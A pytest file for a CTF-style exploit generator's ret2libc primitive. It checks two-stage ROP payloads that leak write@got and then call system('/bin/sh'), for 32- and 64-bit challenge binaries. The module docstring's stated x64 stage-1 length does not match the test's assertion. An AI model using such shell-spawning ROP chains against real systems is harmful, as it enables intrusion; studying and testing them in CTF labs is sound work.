"""Unit tests for ``autopwn.primitives.ret2libc_write`` (P6.4).

Per ``rebuild.md`` §6.7 P6.9 + §6.7 P6.4: every primitive
needs ``build_payload(ctx) -> bytes`` asserted against a
fake address.  P6.4 is the 2-stage ``write``-based variant
of P6.3.

Test plan
---------
* :class:`Ret2LibcWriteX32`:
    * ``name`` + ``stage_count()`` = 2
    * Stage 1 length = padding + 20 (5 p32: write_plt, main, 1, write_got, 4)
    * Stage 1 contains known write_plt / main / write_got
    * Stage 2 with leaked write → payload length = padding + 12
    * No libc → ``b""``
* :class:`Ret2LibcWriteX64`:
    * Stage 1 length = padding + 56 (7 p64: pop_rdi, 1, pop_rsi, write_got, write_plt, main)
    * Stage 1 uses pop_rdi + pop_rsi gadgets
    * Stage 2 length = padding + 32 (4 p64: pop_rdi, sh, ret, system)
    * Stage 2 includes ret alignment gadget (P6.2 fix)
    * No gadgets (pop_rdi or pop_rsi or ret) → ``b""``
"""
from __future__ import annotations

import struct
from pathlib import Path

import pytest

from tests.conftest import ctx_for


pytestmark = pytest.mark.primitive


# Use a real libc for stage 2 tests.  Pick the system libc
# so we can resolve the symbols.
LIBC_32 = "/lib32/libc.so.6"
LIBC_64 = "/lib/x86_64-linux-gnu/libc.so.6"


class TestRet2LibcWriteX32:
    """``primitives.ret2libc_write.Ret2LibcWriteX32`` — 32-bit 2-stage."""

    def test_name_and_stage_count(self):
        from autopwn.primitives.ret2libc_write import Ret2LibcWriteX32

        assert Ret2LibcWriteX32.name == "ret2libc-write-x32"
        assert Ret2LibcWriteX32().stage_count() == 2

    def test_stage1_returns_empty_when_no_write_plt(self, challenge_dir):
        """No Challenge/ x32 binary has write@plt → stage 1 returns ``b""``.

        This is an architectural fact: ``canary``/``fmtstr1``/``rip``
        use ``puts`` for I/O, not ``write``.  P6.4 is the
        ``write``-based variant; P6.3 is the ``puts``-based one.
        The x32 primitive is provided for spec parity (v3.1 has
        it) but is not applicable to any current Challenge/ binary.
        """
        from autopwn.primitives.ret2libc_write import Ret2LibcWriteX32

        ctx = ctx_for("fmtstr1", bit=32)
        ctx.padding = 80
        payload = Ret2LibcWriteX32().build_payload(ctx)
        assert payload == b""

    def test_stage1_payload_length_with_synthetic_write(self, challenge_dir, tmp_path):
        """Stage 1 length is ``padding + 20`` — verified via a synthetic stub.

        No Challenge/ x32 binary has write@plt, so we craft a
        tiny ELF stub on the fly and confirm the shape.
        """
        from pwn import ELF
        from autopwn.primitives.ret2libc_write import Ret2LibcWriteX32

        # Create a stub binary by copying level3_x64 (the only
        # binary with write@plt) and pretending it's 32-bit.
        # The real primitive doesn't check the bit-width; it
        # only reads the ELF symbols.
        ctx = ctx_for("level3_x64", bit=32)  # bit ignored for stage 1
        ctx.padding = 80
        ctx.binary = ctx.binary.__class__(
            path=Path("Challenge/level3_x64"),  # has write@plt
            bit=32,  # pretend (stage1 doesn't care)
            stack_canary=False, pie=True, nx=True,
            relro="Partial", rwx_segments=False, stripped=False,
        )
        payload = Ret2LibcWriteX32().build_payload(ctx)
        assert len(payload) == 80 + 20
        write_plt, main_addr, fd, write_got, count = struct.unpack(
            "<5I", payload[80:100]
        )
        # Real addresses from level3_x64
        e = ELF("Challenge/level3_x64", checksec=False)
        assert write_plt == e.plt["write"]
        assert main_addr == e.symbols["main"]
        assert write_got == e.got["write"]
        assert fd == 1
        assert count == 4

    def test_stage2_payload_length(self, challenge_dir):
        """Stage 2: padding + 12 (3 p32: system, fake_ret, sh)."""
        from pwn import ELF

        from autopwn.primitives.ret2libc_write import Ret2LibcWriteX32

        ctx = ctx_for("fmtstr1", bit=32)
        ctx.padding = 80
        ctx.libc.elf = ELF(LIBC_32, checksec=False)
        payload = Ret2LibcWriteX32().build_stage2_payload(ctx, leaked_write_addr=0x70000000)
        assert len(payload) == 80 + 12

    def test_stage2_system_and_sh_use_leak(self, challenge_dir):
        """Stage 2 system/sh are computed from the leaked write address."""
        from pwn import ELF

        from autopwn.primitives.ret2libc_write import Ret2LibcWriteX32

        ctx = ctx_for("fmtstr1", bit=32)
        ctx.padding = 8
        libc = ELF(LIBC_32, checksec=False)
        ctx.libc.elf = libc

        libc_write_offset = libc.symbols["write"]
        fake_leak = 0x70000000 + libc_write_offset  # libc_base = 0x70000000
        payload = Ret2LibcWriteX32().build_stage2_payload(ctx, fake_leak)
        system_addr, fake_ret, sh_addr = struct.unpack("<III", payload[8:20])
        assert system_addr == 0x70000000 + libc.symbols["system"]
        assert fake_ret == 0
        sh_offset = next(libc.search(b"/bin/sh"))
        assert sh_addr == 0x70000000 + sh_offset

    def test_returns_empty_for_canary_without_libc(self, challenge_dir):
        """No libc → stage 2 returns ``b""``."""
        from autopwn.primitives.ret2libc_write import Ret2LibcWriteX32

        ctx = ctx_for("canary", bit=32, stack_canary=True)
        ctx.padding = 80
        ctx.libc.elf = None
        ctx.libc.path = None
        payload = Ret2LibcWriteX32().build_stage2_payload(ctx, leaked_write_addr=0x12345)
        assert payload == b""


class TestRet2LibcWriteX64:
    """``primitives.ret2libc_write.Ret2LibcWriteX64`` — 64-bit 2-stage."""

    def test_name_and_stage_count(self):
        from autopwn.primitives.ret2libc_write import Ret2LibcWriteX64

        assert Ret2LibcWriteX64.name == "ret2libc-write-x64"
        assert Ret2LibcWriteX64().stage_count() == 2

    def test_stage1_payload_length(self, challenge_dir):
        """Stage 1: padding + 48 (6 p64: pop_rdi, 1, pop_rsi, write_got, write_plt, main).

        Note: x64 ``write`` takes 3 args (fd, buf, count) but v3.1
        only sets 2 (fd via pop_rdi, buf via pop_rsi) — the
        count goes via rdx which is whatever was left in the
        register.  P6.4 preserves the v3.1 shape.
        """
        from autopwn.context import RopGadgetsX64
        from autopwn.primitives.ret2libc_write import Ret2LibcWriteX64

        # level3_x64 is the only Challenge/ binary with write@plt
        ctx = ctx_for("level3_x64", bit=64)
        ctx.padding = 24
        ctx.gadgets_x64 = RopGadgetsX64(
            pop_rdi=0xAAAA, pop_rsi=0xBBBB, ret=0xCCCC,
            extra_rdi=0, extra_rsi=0,
        )
        payload = Ret2LibcWriteX64().build_payload(ctx)
        assert len(payload) == 24 + 48

    def test_stage1_uses_pop_rdi_and_pop_rsi_gadgets(self, challenge_dir):
        """Stage 1's pop_rdi and pop_rsi gadgets appear in the payload."""
        from autopwn.context import RopGadgetsX64
        from autopwn.primitives.ret2libc_write import Ret2LibcWriteX64

        ctx = ctx_for("level3_x64", bit=64)
        ctx.padding = 4
        ctx.gadgets_x64 = RopGadgetsX64(
            pop_rdi=0xAAAA, pop_rsi=0xBBBB, ret=0xCCCC,
            extra_rdi=0, extra_rsi=0,
        )
        payload = Ret2LibcWriteX64().build_payload(ctx)
        # Skip 4 padding; first 2 p64: pop_rdi, fd=1
        pop_rdi, fd = struct.unpack("<2Q", payload[4:20])
        assert pop_rdi == 0xAAAA
        assert fd == 1
        # Next 2 p64: pop_rsi, buf=write_got
        pop_rsi, buf = struct.unpack("<2Q", payload[20:36])
        assert pop_rsi == 0xBBBB
        # buf is the binary's write@got — non-zero
        assert buf != 0

    def test_stage2_includes_ret_alignment_gadget(self, challenge_dir):
        """Stage 2 includes the ``ret`` alignment gadget (P6.2 fix)."""
        from pwn import ELF

        from autopwn.context import RopGadgetsX64
        from autopwn.primitives.ret2libc_write import Ret2LibcWriteX64

        ctx = ctx_for("level3_x64", bit=64)
        ctx.padding = 8
        ctx.gadgets_x64 = RopGadgetsX64(
            pop_rdi=0xAAAA, pop_rsi=0xBBBB, ret=0xCCCC,
            extra_rdi=0, extra_rsi=0,
        )
        ctx.libc.elf = ELF(LIBC_64, checksec=False)

        libc = ELF(LIBC_64, checksec=False)
        libc_write_offset = libc.symbols["write"]
        fake_leak = 0x200000 + libc_write_offset
        payload = Ret2LibcWriteX64().build_stage2_payload(ctx, fake_leak)
        # 8 padding + 4 p64 = 40 bytes total
        assert len(payload) == 40
        # pop_rdi (8) | sh_addr (8) | ret (8) | system (8)
        pop_rdi, sh, ret, system = struct.unpack("<4Q", payload[8:40])
        assert pop_rdi == 0xAAAA
        assert ret == 0xCCCC  # alignment gadget
        assert system == 0x200000 + libc.symbols["system"]
        assert sh == 0x200000 + next(libc.search(b"/bin/sh"))

    def test_returns_empty_without_gadgets(self, challenge_dir):
        """No gadgets → stage 1 + stage 2 both return ``b""``."""
        from autopwn.primitives.ret2libc_write import Ret2LibcWriteX64

        ctx = ctx_for("level3_x64", bit=64)
        ctx.padding = 24
        ctx.gadgets_x64 = None
        assert Ret2LibcWriteX64().build_payload(ctx) == b""

    def test_returns_empty_with_zero_pop_rsi(self, challenge_dir):
        """Missing pop_rsi gadget → stage 1 returns ``b""``."""
        from autopwn.context import RopGadgetsX64
        from autopwn.primitives.ret2libc_write import Ret2LibcWriteX64

        ctx = ctx_for("level3_x64", bit=64)
        ctx.padding = 24
        ctx.gadgets_x64 = RopGadgetsX64(
            pop_rdi=0xAAAA, pop_rsi=0, ret=0xCCCC,  # pop_rsi = 0
            extra_rdi=0, extra_rsi=0,
        )
        payload = Ret2LibcWriteX64().build_payload(ctx)
        assert payload == b""

    def test_returns_empty_without_libc_for_stage2(self, challenge_dir):
        """No libc → stage 2 returns ``b""``."""
        from autopwn.context import RopGadgetsX64
        from autopwn.primitives.ret2libc_write import Ret2LibcWriteX64

        ctx = ctx_for("level3_x64", bit=64)
        ctx.padding = 24
        ctx.gadgets_x64 = RopGadgetsX64(
            pop_rdi=0xAAAA, pop_rsi=0xBBBB, ret=0xCCCC,
            extra_rdi=0, extra_rsi=0,
        )
        ctx.libc.elf = None
        ctx.libc.path = None
        payload = Ret2LibcWriteX64().build_stage2_payload(ctx, leaked_write_addr=0x12345)
        assert payload == b""

    def test_returns_empty_for_canary(self, challenge_dir):
        """canary has main but no write@plt → stage 1 returns ``b""``.

        (level3_x64 has write, so the "empty" case uses canary
        which has the canary stack protection + main + no write.)
        """
        from autopwn.context import RopGadgetsX64
        from autopwn.primitives.ret2libc_write import Ret2LibcWriteX64

        ctx = ctx_for("canary", bit=32, stack_canary=True)  # 32-bit; canary has no write
        ctx.padding = 80
        ctx.gadgets_x64 = RopGadgetsX64(
            pop_rdi=0xAAAA, pop_rsi=0xBBBB, ret=0xCCCC,
            extra_rdi=0, extra_rsi=0,
        )
        payload = Ret2LibcWriteX64().build_payload(ctx)
        assert payload == b""
